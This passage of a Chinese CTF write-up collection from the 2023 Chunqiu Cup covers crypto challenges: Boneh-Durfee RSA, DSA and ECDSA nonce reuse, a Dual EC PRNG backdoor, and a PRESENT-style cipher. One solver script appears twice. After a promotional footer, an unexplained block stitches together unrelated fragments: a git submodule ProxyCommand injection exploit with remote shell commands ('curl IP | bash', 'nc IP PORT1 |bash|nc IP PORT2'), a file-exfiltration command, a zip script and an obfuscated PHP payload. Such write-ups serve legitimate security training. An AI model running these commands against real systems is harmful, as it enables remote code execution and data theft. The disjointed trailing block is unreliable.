11685621576266163425, 7378717572450323846, 4908893147658497706, 10586831182628493811, 11899608597582086123, 15647492475408068493, 10195914857989312451, 16064632829600111693, 9780775133063281904, 6526449946667500636, 15016467168181810528, 2160819466716990016, 11912452293618884519, 9550349757029282639, 1566217096784906004, 4560744952854881937, 13493858161409847662, 8642224708864781426, 813339077207985987, 12572278459937570136, 6796070398584497746, 1006425276835030721, 13115985689965052354, 11377294958063509071, 3038723558430217518, 8172110725900636478, 8983486879293288157, 9974873772240774316, 17191696214470602620, 4247556959901431628, 3833409873219572975, 2353731908068428081, 13062253927604735062, 5095469477202667666, 11382068953038002603, 11938487407728057076, 3485736351074604284, 17210888403417479232, 13857230613238611833, 7100017553035715914, 11278596496234199907, 15131225786650599769, 7219295189157942865, 8003918415637509075, 15318562508580634666, 11010657345162096808, 3124483107803257235, 16476906405380659427, 14118752532388737457, 7758810490123077973, 9952001032509702133, 17660566739729953626, 10807033945785922113, 13433012773434186681, 7998985219406817569, 13290433586511064813, 17960258736609822843, 11640339485176218713, 7262961119342689982, 8954848283415948113, 7486393753961442451, 11564708326733322351, 2774939610308908045, 18289500074608293921, 12797235116675566188, 3665314819662628199, 4339208423645057876, 9891719794901350172, 17252389420446961536, 2088792745124906531, 7607764365688550150, 8857070218343223415, 1715816090223136957, 18422076585938758356, 4257089771318230815, 2941873621976391998, 8591262790183571617, 13185721916710932202, 12150232467342833339, 14129026293696237890, 10243890929873528779, 9718971316878786477, 9558394794771259844, 13524222093275577792, 13612131759654850945, 8053781650739871525, 11246785761149773209, 12646969397136131035, 13416156134946011488, 10416727901968665651, 15523038186457070354, 10603593971508854447, 3303698051744248757, 10109899683440402004, 2503949348962038751, 13488397719469897285, 16090349977178840068, 8478045896308474294, 5920119153271060313, 14591019710613463069, 17421057467160866693]
   #斐波那契 秘钥流 修复
    n = 36
    fib_sequence = fibonacci_sequence(n)
    index1 = [0] * 32
    index2 = [0] * 32
    for i in range(4, len(fib_sequence)):
        index1[i - 4] = fib_sequence[i] % 200
    for i in range(4, len(fib_sequence)):
        index2[i-4] = fib_sequence[i] % 200 - 2
    #秘钥流获取
    for i in range(len(index1)):
        roundkeys[i] = roundkeyse[index1[i]]
    #密文
    index2 = [1, 3, 6, 11, 19, 32, 53, 87, 142, 31, 175, 8, 185, 195, 182, 179, 163, 144, 109, 55, 166, 23, 191, 16, 9,
              27, 38, 67, 107, 176, 85, 63]
    for i in range(4):
        blocks[i]=roundkeyse[index2[12 + i]]
        #roundkeyss[index2[12 + i]] = cryp[i]
    flag = ''
    for block in blocks:
        state = block
        for i in range(rounds-1):
                state = addRoundKey(state, roundkeys[-i-1]) #轮秘钥加就是 state 异或 key
                state = pLayer_dec(state)
                state = sBoxLayer_dec(state)
        decipher = addRoundKey(state, roundkeys[0])
        flag += ''.join([chr(decipher>>(c*8) & 0xff) for c in range(8)])
    print(flag)
#真加密数据：[0xf8955ed29352abc1,0xc4db6fa5f76aed59,0x82aae1b5223bc46e,0x9f202d4c0ce3d519]

#构造伪 密文
cmps = [1,2,3,4]

decrypt(cmps)

upx2023

首先发现exe文件被upx压缩过了尝试脱壳，发现脱壳失败，通过对字节分析发现upx的标识符被破坏了

not_wiener

观察可知，本题为DSA+RSA，flag值为DSA中私钥x的值，且

消元得：

但发现a未知，利用rsa加密，d为280位素数，而n为1024位，不符合维纳攻击条件 但可利用博纳攻击得到a。

from Crypto.Util.number import *
"""
Setting debug to true will display more informations
about the lattice, the bounds, the vectors...
"""
debug = False

"""
Setting strict to true will stop the algorithm (and
return (-1, -1)) if we don't have a correct
upperbound on the determinant. Note that this
doesn't necesseraly mean that no solutions
will be found since the theoretical upperbound is
usualy far away from actual results. That is why
you should probably use `strict = False`
"""
strict = False

"""
This is experimental, but has provided remarkable results
so far. It tries to reduce the lattice as much as it can
while keeping its efficiency. I see no reason not to use
this option, but if things don't work, you should try
disabling it
"""
helpful_only = True
dimension_min = 7  # stop removing if lattice reaches that dimension

############################################
# Functions
##########################################

# display stats on helpful vectors
def helpful_vectors(BB, modulus):
    nothelpful = 0
    for ii in range(BB.dimensions()[0]):
        if BB[ii, ii] >= modulus:
            nothelpful += 1

    print(nothelpful, "/", BB.dimensions()[0], " vectors are not helpful")

# display matrix picture with 0 and X
def matrix_overview(BB, bound):
    for ii in range(BB.dimensions()[0]):
        a = ('%02d ' % ii)
        for jj in range(BB.dimensions()[1]):
            a += '0' if BB[ii, jj] == 0 else 'X'
            if BB.dimensions()[0] < 60:
                a += ' '
        if BB[ii, ii] >= bound:
            a += '~'
        print(a)

# tries to remove unhelpful vectors
# we start at current = n-1 (last vector)
def remove_unhelpful(BB, monomials, bound, current):
    # end of our recursive function
    if current == -1 or BB.dimensions()[0] <= dimension_min:
        return BB

    # we start by checking from the end
    for ii in range(current, -1, -1):
        # if it is unhelpful:
        if BB[ii, ii] >= bound:
            affected_vectors = 0
            affected_vector_index = 0
            # let's check if it affects other vectors
            for jj in range(ii + 1, BB.dimensions()[0]):
                # if another vector is affected:
                # we increase the count
                if BB[jj, ii] != 0:
                    affected_vectors += 1
                    affected_vector_index = jj

            # level:0
            # if no other vectors end up affected
            # we remove it
            if affected_vectors == 0:
                # print("* removing unhelpful vector", ii)
                BB = BB.delete_columns([ii])
                BB = BB.delete_rows([ii])
                monomials.pop(ii)
                BB = remove_unhelpful(BB, monomials, bound, ii - 1)
                return BB

            # level:1
            # if just one was affected we check
            # if it is affecting someone else
            elif affected_vectors == 1:
                affected_deeper = True
                for kk in range(affected_vector_index + 1, BB.dimensions()[0]):
                    # if it is affecting even one vector
                    # we give up on this one
                    if BB[kk, affected_vector_index] != 0:
                        affected_deeper = False
                # remove both it if no other vector was affected and
                # this helpful vector is not helpful enough
                # compared to our unhelpful one
                if affected_deeper and abs(bound - BB[affected_vector_index, affected_vector_index]) < abs(
                        bound - BB[ii, ii]):
                    # print("* removing unhelpful vectors", ii, "and", affected_vector_index)
                    BB = BB.delete_columns([affected_vector_index, ii])
                    BB = BB.delete_rows([affected_vector_index, ii])
                    monomials.pop(affected_vector_index)
                    monomials.pop(ii)
                    BB = remove_unhelpful(BB, monomials, bound, ii - 1)
                    return BB
    # nothing happened
    return BB

""" 
Returns:
* 0,0   if it fails
* -1,-1 if `strict=true`, and determinant doesn't bound
* x0,y0 the solutions of `pol`
"""

def boneh_durfee(pol, modulus, mm, tt, XX, YY):
    """
    Boneh and Durfee revisited by Herrmann and May

    finds a solution if:
    * d < N^delta
    * |x| < e^delta
    * |y| < e^0.5
    whenever delta < 1 - sqrt(2)/2 ~ 0.292
    """

    # substitution (Herrman and May)
    PR. = PolynomialRing(ZZ)
    Q = PR.quotient(x * y + 1 - u)  # u = xy + 1
    polZ = Q(pol).lift()

    UU = XX * YY + 1

    # x-shifts
    gg = []
    for kk in range(mm + 1):
        for ii in range(mm - kk + 1):
            xshift = x ^ ii * modulus ^ (mm - kk) * polZ(u, x, y) ^ kk
            gg.append(xshift)
    gg.sort()

    # x-shifts list of monomials
    monomials = []
    for polynomial in gg:
        for monomial in polynomial.monomials():
            if monomial not in monomials:
                monomials.append(monomial)
    monomials.sort()

    # y-shifts (selected by Herrman and May)
    for jj in range(1, tt + 1):
        for kk in range(floor(mm / tt) * jj, mm + 1):
            yshift = y ^ jj * polZ(u, x, y) ^ kk * modulus ^ (mm - kk)
            yshift = Q(yshift).lift()
            gg.append(yshift)  # substitution

    # y-shifts list of monomials
    for jj in range(1, tt + 1):
        for kk in range(floor(mm / tt) * jj, mm + 1):
            monomials.append(u ^ kk * y ^ jj)

    # construct lattice B
    nn = len(monomials)
    BB = Matrix(ZZ, nn)
    for ii in range(nn):
        BB[ii, 0] = gg[ii](0, 0, 0)
        for jj in range(1, ii + 1):
            if monomials[jj] in gg[ii].monomials():
                BB[ii, jj] = gg[ii].monomial_coefficient(monomials[jj]) * monomials[jj](UU, XX, YY)

    # Prototype to reduce the lattice
    if helpful_only:
        # automatically remove
        BB = remove_unhelpful(BB, monomials, modulus ^ mm, nn - 1)
        # reset dimension
        nn = BB.dimensions()[0]
        if nn == 0:
            print("failure")
            return 0, 0

    # check if vectors are helpful
    if debug:
        helpful_vectors(BB, modulus ^ mm)

    # check if determinant is correctly bounded
    det = BB.det()
    bound = modulus ^ (mm * nn)
    if det >= bound:
        # print("We do not have det < bound. Solutions might not be found.")
        # print("Try with highers m and t.")
        if debug:
            diff = (log(det) - log(bound)) / log(2)
            # print("size det(L) - size e^(m*n) = ", floor(diff))
        if strict:
            return -1, -1
    else:
        print("det(L) < e^(m*n) (good! If a solution exists < N^delta, it will be found)")

    # display the lattice basis
    if debug:
        matrix_overview(BB, modulus ^ mm)

    # LLL
    if debug:
        print("optimizing basis of the lattice via LLL, this can take a long time")

    BB = BB.LLL()

    if debug:
        print("LLL is done!")

    # transform vector i & j -> polynomials 1 & 2
    if debug:
        print("looking for independent vectors in the lattice")
    found_polynomials = False

    for pol1_idx in range(nn - 1):
        for pol2_idx in range(pol1_idx + 1, nn):
            # for i and j, create the two polynomials
            PR.<w,z> = PolynomialRing(ZZ)
            pol1 = pol2 = 0
            for jj in range(nn):
                pol1 += monomials[jj](w * z + 1, w, z) * BB[pol1_idx, jj] / monomials[jj](UU, XX, YY)
                pol2 += monomials[jj](w * z + 1, w, z) * BB[pol2_idx, jj] / monomials[jj](UU, XX, YY)

            # resultant
            PR.<q> = PolynomialRing(ZZ)
            rr = pol1.resultant(pol2)

            # are these good polynomials?
            if rr.is_zero() or rr.monomials() == [1]:
                continue
            else:
                # print("found them, using vectors", pol1_idx, "and", pol2_idx)
                found_polynomials = True
                break
        if found_polynomials:
            break

    if not found_polynomials:
        # print("no independant vectors could be found. This should very rarely happen...")
        return 0, 0

    rr = rr(q, q)

    # solutions
    soly = rr.roots()

    if len(soly) == 0:
        # print("Your prediction (delta) is too small")
        return 0, 0

    soly = soly[0][0]
    ss = pol1(q, soly)
    solx = ss.roots()[0][0]

    #
    return solx, soly

N = 98871082998654651904594468693622517613869880791884929588100914778964766348914919202255397776583412976785216592924335179128220634848871563960167726280836726035489482233158897362166942091133366827965811201438682117312550600943385153640907629347663140487841016782054145413246763816202055243693289693996466579973
e = 76794907644383980853714814867502708655721653834095293468287239735547303515225813724998992623067007382800348003887194379223500764768679311862929538017193078946067634221782978912767213553254272722105803768005680182504500278005295062173004098796746439445343896868825218704046110925243884449608326413259156482881
c = 13847199761503953970544410090850216804358289955503229676987212195445226107828814170983735135692611175621170777484117542057117607579344112008580933900051471041224296342157618857321522682033260246480258856376097987259016643294843196752685340912823459403703609796624411954082410762846356541101561523204985391564
delta = .275  # this means that d < N^delta
m = 8  # size of the lattice (bigger the better/slower)
t = int((1 - 2 * delta) * m)  # optimization from Herrmann and May
X = 2 * floor(N ^ delta)  # this _might_ be too much
Y = floor(N ^ (1 / 2))  # correct if p, q are ~ same size
P.<x,y> = PolynomialRing(ZZ)
A = int((N + 1) / 2)
pol = 1 + x * (A + y)

solx, soly = boneh_durfee(pol, e, m, t, X, Y)
d = int(pol(solx, soly) / e)
#print(d)
a= power_mod(c, d, N)
print(a)

将a代入

from Crypto.Util.number import *
from gmpy2 import *
import libnum

a= 24601959430759983424400804734518943158892550216065342062971649989571838687333
b= 17474742587088593627
p= 161310487790785086482919800040790794252181955976860261806376528825054571226885460699399582301663712128659872558133023114896223014064381772944582265101778076462675402208451386747128794418362648706087358197370036248544508513485401475977401111270352593919906650855268709958151310928767086591887892397722958234379
q= 1115861146902610160756777713087325311747309309771
g= 61073566757714587321114447684333928353300944355112378054603585955730395524359123615359185275743626350773632555967063692889668342544616165017003197599818881844811647270423070958521148291118914198811187731689123176313367399492561288350530256722898205674043032421874788802819858438796795768177550638273020791962
y= 23678147495254433946472657196764372220306841739888385605070426528738230369489739339976134564575544246606937803367113623097260181789372915552172469427842482448570540429192377881186772226796452797182435452490307834205012154495575570994963829345053331967442452842152258650027916313982835119514473311305158299360
(h1, r1, s1) = 535874494834828755542711401117152397489711233142, 117859946800380767356190121030392492081340616512, 26966646740134065096660259687229179143947213779
(h2, r2, s2) = 236574518096866758760287021848258048065293279716, 863199000523521111517835459866422731857447792677, 517924607931342012033031470185302567344725962419

a=24601959430759983424400804734518943158892550216065342062971649989571838687333
k = (h1*r2 - h2*r1 + b*s2*r1) * inverse(s1*r2 - a*s2*r1, q) % q
m = (s1*k - h1) * invert(r1,q) % q
flag = b'flag{' + libnum.n2s(int(m)) + b'}'
print(flag)

ez_ECC

第一部分 求解hint：

已知n = p*q和leak = p+q，建立方程求解即可得到p和q的值，由于GCD(e,phi) != 1,考虑AMM算法求解：

# 第一部分：求解hint
Hint = (12351774260625362799610458605055557349668978169954248709224197283033722650641969191523420968152180626844781310599988085824706330561484553939064653937267598659731237154241515349280967639128615784193195725170343153328247947729351564102666060302013802359410482179324719156651832539747622404434096773119440083329, 122908984806235457892414635852036332676574434804833208576141668077475917235411535511069143359388659946159724740722593181625712110278669227640297497485641848470391938438894136564046632275052354217712453952532772368082733299695485759213723305738760035793602060420638500827652832664161031815519780589765520132973, 22333858470427703056488469739724305644350178024239032705153649807913901449803887198889611591209527103787726531081225700412575986297091811550954958064297166)
c,n,leak = Hint

x = symbols('x')
f = x*(leak-x) - n
q,p = solve(f,x)

# About 3 seconds to run
def AMM(o, r, q):
    start = time.time()
    print('n----------------------------------------------------------------------------------')
    print('Start to run Adleman-Manders-Miller Root Extraction Method')
    print('Try to find one {:#x}th root of {} modulo {}'.format(r, o, q))
    g = GF(q)
    o = g(o)
    p = g(random.randint(1, q))
    while p ^ ((q - 1) // r) == 1:
        p = g(random.randint(1, q))
    print('[+] Find p:{}'.format(p))
    t = 0
    s = q - 1
    while s % r == 0:
        t += 1
        s = s // r
    print('[+] Find s:{}, t:{}'.format(s, t))
    k = 1
    while (k * s + 1) % r != 0:
        k += 1
    alp = (k * s + 1) // r
    print('[+] Find alp:{}'.format(alp))
    a = p ^ (r ** (t - 1) * s)
    b = o ^ (r * alp - 1)
    c = p ^ s
    h = 1
    for i in range(1, t):
        d = b ^ (r ^ (t - 1 - i))
        if d == 1:
            j = 0
        else:
            print('[+] Calculating DLP...')
            j = - discrete_log(d, a)
            print('[+] Finish DLP...')
        b = b * (c ^ r) ^ j
        h = h * c ^ j
        c = c ^ r
    result = o ^ alp * h
    end = time.time()
    print("Finished in {} seconds.".format(end - start))
    print('Find one solution: {}'.format(result))
    return result

def onemod(p, r):
    t = random.randint(2, p)
    while pow(t, (p - 1) // r, p) == 1:
        t = random.randint(2, p)
    return pow(t, (p - 1) // r, p)

def solution(p, root, e):
    while True:
        g = onemod(p, e)
        may = []
        for i in tqdm(range(e)):
            may.append(root * pow(g, i, p) % p)
        if len(may) == len(set(may)):
            return may

def solve_in_subset(ep, p):
    cp = int(pow(c, inverse(int(e // ep), p - 1), p))
    com_factors = []
    while GCD(ep, p - 1) != 1:
        com_factors.append(GCD(ep, p - 1))
        ep //= GCD(ep, p - 1)
    com_factors.sort()

    cps = [cp]
    for factor in com_factors:
        mps = []
        for cp in cps:
            mp = AMM(cp, factor, p)
            mps += solution(p, mp, factor)
        cps = mps
    for each in cps:
        assert pow(each, e, p) == c % p
    return cps

p = 12505332663944649833363705782585622154783535731134356705062751557012581621705445087053420721597737291635565932107641867441872588740363132435706587458477029
q = 9828525806483053223124763957138683489566642293104676000090898250901319828098442111836190869611789812152160598973583832970703397556728679115248370605820137
e = 16542764952
c = 12351774260625362799610458605055557349668978169954248709224197283033722650641969191523420968152180626844781310599988085824706330561484553939064653937267598659731237154241515349280967639128615784193195725170343153328247947729351564102666060302013802359410482179324719156651832539747622404434096773119440083329

ep = 984
eq = 24
m_p = solve_in_subset(ep, p)
m_q = solve_in_subset(eq, q)

start = time.time()
print('Start CRT...')
for mpp in m_p:
    for mqq in m_q:
        solution = CRT_list([int(mpp), int(mqq)], [p, q])
        if solution < 2 ^ 800:  # Always the bit_length of flag is less than 800
            print(long_to_bytes(solution))

end = time.time()
print("Finished in {} seconds.".format(end - start))

得到hint = b"Anything greater than 2^15 is really that's too big"

第二部分 ECDSA问题：

由于同时泄露了m1和m2的签名值，且两次签名都使用相同k值进行签名（可参考https://www.cnblogs.com/Netsharp/p/15926867.html），两次签名的方程可以通过线性变换为：

K = (s1 -s2)^-1 * (z1 -z2) mod n

于是我们便可以求解得到k值，与此同时，方程求解pri_key值也知晓。由m1中b’A typical Dual ec prng vulnerability applied to NSA, you can find its source in past papers.’可以查询Dual ec prng。

可以发现伪随机数算法 dual ec prng的后门问题：

（https://github.com/LeadroyaL/dual_ec_prng_poc/blob/master/docs.mdv）

可以得知：在伪随机数的生成中，可以人为制造一个 Q*k = P （k为人为制造）,从而使后续的伪随机数都可预测。Hint提示大于2^15太大，于是在2^15范围内爆破k 值，得到正确k值往后预测Key值即可。Flag便可求得。

from hashlib import *
from Crypto.Util.number import *
import ecdsa
from tqdm import tqdm

curves = ecdsa.curves
NIST256p = curves.NIST256p
NIST384p = curves.NIST384p

p_NIST256p = NIST256p.curve.p()
a_NIST256p = NIST256p.curve.a()
b_NIST256p = NIST256p.curve.b()
g_NIST256p = (NIST256p.generator.x(), NIST256p.generator.y())

p_NIST384p = NIST384p.curve.p()
a_NIST384p = NIST384p.curve.a()
b_NIST384p = NIST384p.curve.b()
g_NIST384p = (NIST384p.generator.x(), NIST384p.generator.y())

E_NIST256p = EllipticCurve(GF(p_NIST256p), [a_NIST256p, b_NIST256p])
E_NIST384p = EllipticCurve(GF(p_NIST384p), [a_NIST384p, b_NIST384p])

G_NIST256p = E_NIST256p(g_NIST256p)
G_NIST384p = E_NIST384p(g_NIST384p)

q = 39402006196394479212279040100143613805079739270465446667946905279627659399113263569398956308152294913554433653942643
m1 = b'A typical Dual ec prng vulnerability applied to NSA, you can find its source in past papers.'
m2 = b'Hope you have learned a good foundation of ECDSA, it can help you better answer and understand this problem.'
z1 = int(sha256(m1).hexdigest(), 16)
z2 = int(sha256(m2).hexdigest(), 16)

f = open('outpute.txt', 'r')
Data = f.read().split('-------------------------------------------------------------------n')

# 第一部分：求解hint
Hint = (12351774260625362799610458605055557349668978169954248709224197283033722650641969191523420968152180626844781310599988085824706330561484553939064653937267598659731237154241515349280967639128615784193195725170343153328247947729351564102666060302013802359410482179324719156651832539747622404434096773119440083329, 122908984806235457892414635852036332676574434804833208576141668077475917235411535511069143359388659946159724740722593181625712110278669227640297497485641848470391938438894136564046632275052354217712453952532772368082733299695485759213723305738760035793602060420638500827652832664161031815519780589765520132973, 22333858470427703056488469739724305644350178024239032705153649807913901449803887198889611591209527103787726531081225700412575986297091811550954958064297166)
c,n,leak = Hint

x = symbols('x')
f = x*(leak-x) - n
q,p = solve(f,x)

# About 3 seconds to run
def AMM(o, r, q):
    start = time.time()
    print('n----------------------------------------------------------------------------------')
    print('Start to run Adleman-Manders-Miller Root Extraction Method')
    print('Try to find one {:#x}th root of {} modulo {}'.format(r, o, q))
    g = GF(q)
    o = g(o)
    p = g(random.randint(1, q))
    while p ^ ((q - 1) // r) == 1:
        p = g(random.randint(1, q))
    print('[+] Find p:{}'.format(p))
    t = 0
    s = q - 1
    while s % r == 0:
        t += 1
        s = s // r
    print('[+] Find s:{}, t:{}'.format(s, t))
    k = 1
    while (k * s + 1) % r != 0:
        k += 1
    alp = (k * s + 1) // r
    print('[+] Find alp:{}'.format(alp))
    a = p ^ (r ** (t - 1) * s)
    b = o ^ (r * alp - 1)
    c = p ^ s
    h = 1
    for i in range(1, t):
        d = b ^ (r ^ (t - 1 - i))
        if d == 1:
            j = 0
        else:
            print('[+] Calculating DLP...')
            j = - discrete_log(d, a)
            print('[+] Finish DLP...')
        b = b * (c ^ r) ^ j
        h = h * c ^ j
        c = c ^ r
    result = o ^ alp * h
    end = time.time()
    print("Finished in {} seconds.".format(end - start))
    print('Find one solution: {}'.format(result))
    return result

def onemod(p, r):
    t = random.randint(2, p)
    while pow(t, (p - 1) // r, p) == 1:
        t = random.randint(2, p)
    return pow(t, (p - 1) // r, p)

def solution(p, root, e):
    while True:
        g = onemod(p, e)
        may = []
        for i in tqdm(range(e)):
            may.append(root * pow(g, i, p) % p)
        if len(may) == len(set(may)):
            return may

def solve_in_subset(ep, p):
    cp = int(pow(c, inverse(int(e // ep), p - 1), p))
    com_factors = []
    while GCD(ep, p - 1) != 1:
        com_factors.append(GCD(ep, p - 1))
        ep //= GCD(ep, p - 1)
    com_factors.sort()

    cps = [cp]
    for factor in com_factors:
        mps = []
        for cp in cps:
            mp = AMM(cp, factor, p)
            mps += solution(p, mp, factor)
        cps = mps
    for each in cps:
        assert pow(each, e, p) == c % p
    return cps

p = 12505332663944649833363705782585622154783535731134356705062751557012581621705445087053420721597737291635565932107641867441872588740363132435706587458477029
q = 9828525806483053223124763957138683489566642293104676000090898250901319828098442111836190869611789812152160598973583832970703397556728679115248370605820137
e = 16542764952
c = 12351774260625362799610458605055557349668978169954248709224197283033722650641969191523420968152180626844781310599988085824706330561484553939064653937267598659731237154241515349280967639128615784193195725170343153328247947729351564102666060302013802359410482179324719156651832539747622404434096773119440083329

ep = 984
eq = 24
m_p = solve_in_subset(ep, p)
m_q = solve_in_subset(eq, q)

start = time.time()
print('Start CRT...')
for mpp in m_p:
    for mqq in m_q:
        solution = CRT_list([int(mpp), int(mqq)], [p, q])
        if solution < 2 ^ 800:  # Always the bit_length of flag is less than 800
            print(long_to_bytes(solution))

end = time.time()
print("Finished in {} seconds.".format(end - start))

# b"Anything greater than 2^15 is really that's too big"
# b"Anything greater than 2^15 is really that's too big"
# Finished in 0.3607470989227295 seconds.

#第二部分：爆破Dual_prng
for j in tqdm(range(250)):
    #     print(f'Start process {j}:')
    # 数据处理
    data = Data[j].split('n')
    C = eval(data[0][4:])
    Hint = eval(data[1][7:])
    pub_key_data = data[2][10:].split(',')
    pub_key = (eval(pub_key_data[0][5:-1]), eval(pub_key_data[1][5:-2]))
    P = eval(data[3][4:])
    Q = eval(data[4][4:])
    sign1 = eval(data[5][8:])
    sign2 = eval(data[6][8:])
    into_secret_data = data[7][14:].split(':')
    into_secret = (eval(into_secret_data[0][1:]), eval(into_secret_data[1]))
    # print(into_secret)

    k = inverse(sign1[1] - sign2[1], q) * (z1 - z2) % q

    pri_key = (k * sign1[1] - z1) * inverse(sign1[0], q) % q
    #     print(pri_key, int(pri_key).bit_length())
    P = E_NIST256p(P)
    Q = E_NIST256p(Q)
    P_Q_number = 0
    for i1 in range(1, 2 ^ 15):
        try:
            if i1 * Q == P:
                P_Q_number = i1
                print(i1)
                break
        
except:
            pass
    if P_Q_number == 0:
        #         print(f'The {j} is failed')
        continue

    print('We have find the right P_Q_number')
    num, Key = 0, 0
    for i in tqdm(range(1, 2 ^ 6)):
        T = (i << 250) + pri_key
        try:
            state = int(((E_NIST256p.lift_x(T)) * P_Q_number).xy()[0])
            out0 = 0
            for i1 in range(2):
                t = int((state * Q).xy()[0])
                out0 = (out0 << 250) + t % (2 ** 250)
                state = int((state * P).xy()[0])

            out = 0
            for i1 in range(2):
                t = int((state * Q).xy()[0])
                out = (out << 250) + t % (2 ** 250)
                state = int((state * P).xy()[0])

            out = long_to_bytes(out % (2 ^ 384))
            k1 = int(sha256(out).hexdigest(), 16)
            if k1 == k:
                Key = out0 % (2 ^ 384)
                num = T
                print('Key = ', Key)
                break
        
except:
            pass

    C = int(C)
    into_secret = E_NIST384p(into_secret[0], into_secret[1])
    secret = inverse(Key, q) * into_secret
    secret = secret.xy()[0]
    flag = long_to_bytes(int(secret) ^^ int(C))
    print('We have find the right flag!')
    print(f'flag : {flag}')
    break

CF is Crypto Faker

1.先关注README.txt

Please firstly pay attention to the file named as "task.py".
The real flag is a little strange.
However, there is no need to be messy in your mind just because of the "appearance" of the flag.
Just be self-confident!

2.按照README.txt指示，去看task.py，分析task.py，对照task.py中引用的多个import文件理解过程

from Crypto.Util.number import *
import initialize
import train
import valid
import test
import rec
from secret import message, flag_point

flag = b"flag{" + long_to_bytes(message) + long_to_bytes(flag_point) + b".}"

p = getPrime(512)
q = getPrime(512)
n = p * q
print("The significant parameter n: %s" % hex(n))
phi0 = (p - 1) * (q - 1)
r = rec.rec(p, q)
print("The unique parameter r: %s" % hex(r))

parameters = initialize.initialize(p, q)
wild_phi = parameters[0]
wild_e = parameters[1]
print("------")

print("Parameters are initialized to: n  phi:%sn" % hex(wild_phi), " e:%s" % hex(wild_e))
print("But they are wild and crazy!")
print("We have to give them a lesson!")
print("------")

parameters = train.train(wild_phi, wild_e, n, r, phi0)
trained_phi = parameters[0]
trained_e = parameters[1]
print("Parameters are trained to: n  phi:%sn" % hex(trained_phi), " e:%s" % hex(trained_e))
print("After training, the two naughty parameters are more and more normal.")
print("It's closer to your target!")
print("------")

parameters = valid.valid(trained_phi, trained_e, n)
y_valid = parameters[0]
print("The encrypted output in validation set is %s" % hex(y_valid))
print("After validation, the model is more and more stable.")
print("To test the real flag!")
print("------")

parameters = test.test(trained_phi, trained_e, n)
y_hat_cipher1 = parameters[0]
y_hat_cipher2 = parameters[1]
print("The final output is n%s" % hex(y_hat_cipher1), "n%s" % hex(y_hat_cipher2))
print("------")

3.对着task.py，看output.txt，分析出已知量：

参数
内容

大数n
值为p*q

参数r
对比rec.py函数过程，猜测为reciprocal缩写，译为“倒数”，值为(2023 * p + q) // p * q，但是因为//，所以与真正的分数线除法运算有误差

wild_phi
值为2023+(p-2023)*q-p

wild_e
值为|p-q|

损失值loss
真实的phi0=(p-1)*(q-1)与拟定的phi_loss=solvable_function(wild_phi,n,r)的差值

trained_phi
（值为wild_phi+loss）；

参数
内容

trained_e
值为wild_e-NOISE(noise)，NOISE(noise)为noise的一次多项式，noise为随机8位素数

y_valid
由给定的明文按照训练好的trained_phi、trained_e进行rsa常规加密的密文，
其中assert long_to_bytes(text) == long_to_bytes(pow(cipher, d, z))代码可得出trained_phi、trained_e恰好互素

y_hat_cipher1
message对应的密文的十六进制

y_hat_cipher2
flag_point对应的密文的十六进制

GAME福利

为了让更多选手可以回味本次比赛的精彩过程，持续学习和训练，春秋GAME团队将本次题目部署到i春秋CTF大本营的“2023年春秋杯网络安全联赛冬季赛”，欢迎各位师傅交流讨论。
https://www.ichunqiu.com/competition

春秋杯网络安全联赛将持续打造网络安全新社区，希望更多参赛选手通过比赛结识志同道合的朋友以及交流经验和技巧，欢迎更多伙伴加入春秋杯赛事宇宙，期待大家再次相聚，继续挑战新高度，探索更广阔的宇宙星河！

春秋杯赛事交流QQ群：277328440；

春秋杯赛事交流群（微信群），进群请加微信：LNX131020

相关阅读


```
host *.ichunqiu.com
  ProxyCommand /usr/bin/nc -X connect -x 192.0.2.0:
8080 %h %p
--recurse-submodules
# 在克隆Git仓库的时候，同时初始化并更新仓库中的所有子模块
ssh://`命令语句`foo.ichunqiu.com/bar
curl IP | bash
nc IP PORT1 |bash|nc IP PORT2
bash exp.sh
# 命令中出现/会解析错误，可以把命令写入exp.sh再执行
cat /flag > /var/www/html/flag
git clone https://github.com/vin01/poc-proxycommand-vulnerable
cd poc-proxycommand-vulnerable && vi .gitmodules
# 修改url里的命令语句
git add .
git commit -m "gamelab"
mkdir gamelab && cd gamelab
git init .
# 没法直接添加不存在的地址
git submodule add https://github.com/chunqiugame/test cve
vi .gitmodules
# 修改url里的命令语句
git add .
git commit -m "gamelab"
import base64
import re
import zipfile

# 获取文件名称列表
zip_file_path = '外卖箱.zip'

with zipfile.ZipFile(zip_file_path, 'r',) as zip_ref:
    # 获取压缩包中所有文件的列表
    file_list = zip_ref.namelist()
    file_list_decoded = [file.encode('cp437').decode('gbk') for file in file_list]

# 打印文件列表
# print(file_list_decoded)

# 获取base64信息
base64_data_list = []
for i in file_list_decoded:
    try:
        base64_data = re.search(r"用户(d+)_([w+-=]{4})的外卖", i).groups()
        base64_data_list.append(base64_data)
    
except:
        # print(i)
        pass

# 按照用户编号进行排序
base64_data_list_sorted = sorted(base64_data_list, key=lambda i: int(i[0]))
# print(base64_data_list_sorted)

# base64值
base64_data_str_raw = ''.join([i[1] for i in base64_data_list_sorted])

# 根据提示替换掉其中的-为/
base64_data_str = base64_data_str_raw.replace('-', '/')
print(base64_data_str)
# 添加文件头
zip = "504b03"
base64_data_str = base64.b64encode(bytes.fromhex(zip)).decode() + base64_data_str

# 保存压缩包
with open("key.zip", "wb") as f:
    f.write(base64.b64decode(base64_data_str))
flag{W1sh_y0u_AaaAaaaa
<?php  
$O00OO0=urldecode("%6E1%7A%62%2F%6D%615%5C%76%740%6928%2D%70%78%75%71%79%2A6%6C%72%6B%64%679%5F%65%68%63%73%77%6F4%2B%6637%6A");  
$O00O0O=$O00OO0{3}.$O00OO0{6}.$O00OO0{33}.$O00OO0{30};$O0OO00=$O00OO0{33}.$O00OO0{10}.$O00OO0{24}.$O00OO0{10}.$O00OO0{24};$OO0O00=$O0OO00{0}.$O00OO0{18}.$O00OO0{3}.$O0OO00{0}.$O0OO00{1}.$O00OO0{24};$OO0000=$O00OO0{7}.$O00OO0{13};$O00O0O.=$O00OO0{22}.$O00OO0{36}.$O00OO0{29}.$O00OO0{26}.$O00OO0{30}.$O00OO0{32}.$O00OO0{35}.$O00OO0{26}.$O00OO0{30};  
  
$O0O000="NoJpuRUVQdeXLBwFaEvMPhtCIxlAYrHDsOynWScjTKkZgmbqGifzkLexbWjMsNrBOgcRInyZCdaAzEqUfvJDGTtuwQFKhiVmSXPoYlpHCD9cIJUimBmdPAdurXqbmXEdNYjLfXRHmhf0B2Wqf29VmQSuMhguNRZ4rqeKWVkiWA9gjnWyPRNjTJWiMnG4Nj5HN3s4WnNCFuxeF2qzmVqhkYa2huxmruxMIKR5MVmMMVa4MXL5MHg0FXknsjn9CQFxiQV7zUL/CS==";  
